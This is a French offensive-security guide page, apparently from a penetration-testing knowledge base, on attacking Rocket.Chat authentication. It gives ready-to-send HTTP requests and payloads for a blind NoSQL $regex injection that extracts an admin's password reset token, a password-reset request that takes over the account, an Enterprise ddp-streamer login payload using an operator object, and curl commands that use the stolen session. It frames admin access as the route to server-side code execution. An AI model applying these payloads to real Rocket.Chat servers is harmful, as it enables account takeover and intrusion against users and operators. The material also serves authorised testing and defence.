---
title: "Authentification : injection NoSQL et prise de contrôle de compte dans Rocket.Chat"
order: 2
description: "Attaquer l'authentification de Rocket.Chat : pourquoi le /api/v1/login REST ne cède pas à un objet opérateur naïf, l'injection NoSQL en aveugle dans les méthodes de compte et de réinitialisation de mot de passe qui extrait un jeton de réinitialisation stocké caractère par caractère pour prendre le contrôle d'un admin, et l'injection de recherche de nom d'utilisateur ddp-streamer Enterprise qui ne devient un contournement qu'avec la faille distincte du await manquant sur le mot de passe."
keywords:
  - rocket.chat nosql injection
  - mongodb operator injection
  - password reset token extraction
  - ddp-streamer
  - account takeover
---

# Authentification

Rocket.Chat repose sur le système de comptes de Meteor au-dessus de MongoDB. Le contournement folklorique, qui consiste à poster `{"user":{"$gt":""},"password":{"$gt":""}}` vers `/api/v1/login`, ne fonctionne pas : cet endpoint REST force `user` et `password` en chaînes avant de construire la requête, de sorte qu'un objet opérateur est rejeté. Les vraies faiblesses sont ailleurs, dans les appels de méthodes Meteor et les microservices qui construisent un sélecteur Mongo à partir de JSON contrôlé par l'attaquant sans forcer les types scalaires. La plus précieuse est une injection NoSQL en aveugle qui extrait un jeton de réinitialisation de mot de passe stocké, ce qui se transforme en prise de contrôle complète d'un admin sans jamais deviner de mot de passe.

## Préconditions

```bash
curl -s http://<target>:3000/api/info | python3 -c 'import sys,json;print(json.load(sys.stdin).get("version"))'
# the injection surface and the exact vulnerable method are version-bound; pin the build first
```

Vérifiez si les méthodes de compte sont accessibles via les appels de méthodes REST (`/api/v1/method.call/<name>`) ou uniquement via le websocket DDP (`/websocket`) ; les builds plus anciens exposent les appels de méthodes sans authentification, ce qui rend l'oracle en aveugle utilisable avant authentification.

## Injection NoSQL en aveugle pour voler un jeton de réinitialisation

Rocket.Chat stocke un jeton de réinitialisation de mot de passe sur le document utilisateur à `services.password.reset.token` une fois qu'une réinitialisation est demandée. Une méthode de compte vulnérable construit son sélecteur Mongo à partir de votre JSON, de sorte qu'un opérateur `$regex` sur ce champ transforme la méthode en oracle booléen : une requête dont la regex correspond renvoie une réponse différente (un succès/`true`, une longueur de corps différente, ou un écart de temporisation) de celle qui ne correspond pas, ce qui vous permet de récupérer le jeton un caractère à la fois.

Déclenchez d'abord une réinitialisation pour que le jeton existe, puis extrayez-le. Pilotez l'oracle via l'appel de méthode (la forme est spécifique à la version ; l'opérateur et le champ ciblé sont la partie constante) :

```http
POST /api/v1/method.call/getPasswordPolicy HTTP/1.1
Host: target:3000
Content-Type: application/json

{"message":"{\"msg\":\"method\",\"method\":\"getPasswordPolicy\",\"params\":[{\"token\":{\"$regex\":\"^a.*\"}}],\"id\":\"1\"}"}
```

```text
# match  -> HTTP 200 with the policy object (regex matched a user whose reset token starts with 'a')
# miss   -> error / empty result (no user matched)
```

Parcourez l'alphabet à chaque position (`^a`, `^b`, ... puis `^<known>a`, `^<known>b`, ...) pour reconstruire le `services.password.reset.token` complet. Automatisez l'oracle plutôt que de le faire à la main :

```bash
# conceptually: for each position, binary/linear search the charset on the match/miss signal
# nosqli-style tooling drives the same $regex oracle against the method parameter
```

Une fois le jeton récupéré, réinitialisez directement le mot de passe du compte cible :

```http
POST /api/v1/users.resetPassword HTTP/1.1
Host: target:3000
Content-Type: application/json

{"token":"<recovered-reset-token>","newPassword":"Owned-Passw0rd!"}
```

Un `{"success":true}` signifie que le mot de passe est défini ; connectez-vous normalement en tant que cet utilisateur. Dirigez l'extraction vers une adresse e-mail d'admin connue (depuis l'[énumération](enumeration.md)) afin que le compte dont vous prenez le contrôle soit `admin`.

## Le chemin ddp-streamer Enterprise

Sur les builds Enterprise qui scindent la couche temps réel en microservices, le service de compte `ddp-streamer` effectue une recherche de nom d'utilisateur qui accepte bel et bien un objet opérateur, de sorte que `{"$regex":"admin"}` se résout en un compte réel. En soi, cela ne fait que sélectionner un utilisateur ; cela devient un contournement d'authentification lorsqu'il est associé à une faille distincte où le contrôle du mot de passe n'est pas attendu (await), de sorte que la connexion se résout avant la fin de la vérification. Atteignez le streamer via son interface de méthodes websocket plutôt que par la connexion REST du monolithe :

```json
{"msg":"method","method":"login","params":[{"user":{"$regex":"admin","$options":"i"},"password":"anything"}],"id":"1"}
```

La trame `result` renvoie `{"id":"<userId>","token":"<authToken>"}` lorsque les deux conditions s'alignent sur le build affecté. Ce chemin est étroit et lié à la version ; là où il ne se résout pas, repliez-vous sur l'extraction du jeton de réinitialisation ci-dessus, qui est la voie la plus largement applicable.

## Utiliser le jeton

Les deux voies aboutissent à une paire de session. Rocket.Chat authentifie les appels REST avec deux en-têtes ensemble :

```bash
curl -sk -H "X-Auth-Token: <authToken>" -H "X-User-Id: <userId>" \
  http://<target>:3000/api/v1/me | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d["username"],d.get("roles"))'
#   admin ['admin']   confirms the session is the admin account
```

## Suite

Une session admin, c'est toute la partie : elle débloque la fonctionnalité de scripts d'intégration réservée aux admins qui exécute du JavaScript côté serveur, la voie d'exécution de code dans l'[exploitation du serveur](server-exploitation.md). Une session non-admin lit tout de même l'annuaire et les canaux dans l'[énumération](enumeration.md) et constitue un point d'appui depuis lequel pivoter.

## Outils

- [RocketChat/Rocket.Chat (source du serveur, pour lire la méthode vulnérable par build)](https://github.com/RocketChat/Rocket.Chat)
- `wscat`/`websocat` pour piloter les appels DDP `method`/`login` via le websocket.
- [NoSQLMap](https://github.com/codingo/NoSQLMap) pour automatiser l'oracle d'extraction `$regex`.

## Références

- [SonarSource: NoSQL injection in Rocket.Chat](https://www.sonarsource.com/blog/nosql-injections-in-rocket-chat/)
- [Rocket.Chat REST API reference](https://developer.rocket.chat/apidocs)
- [PortSwigger: NoSQL injection](https://portswigger.net/web-security/nosql-injection)
